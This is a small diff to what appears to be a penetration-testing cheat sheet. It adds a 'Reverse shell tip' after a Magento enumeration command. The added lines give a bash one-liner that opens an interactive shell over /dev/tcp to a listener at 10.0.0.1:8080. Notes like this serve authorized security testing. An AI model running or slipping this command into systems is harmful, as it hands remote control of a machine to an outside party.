@@ -369,3 +369,9 @@ Use [magescan](https://github.com/steverobbins/magescan) to enumerate magento si
 ```
 php magescan.phar scan:all www.example.com
 ```
+
+### Reverse shell tip
+If bash shell is not working, try wrapping it in a bash -c call.
+```
+"bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
+```
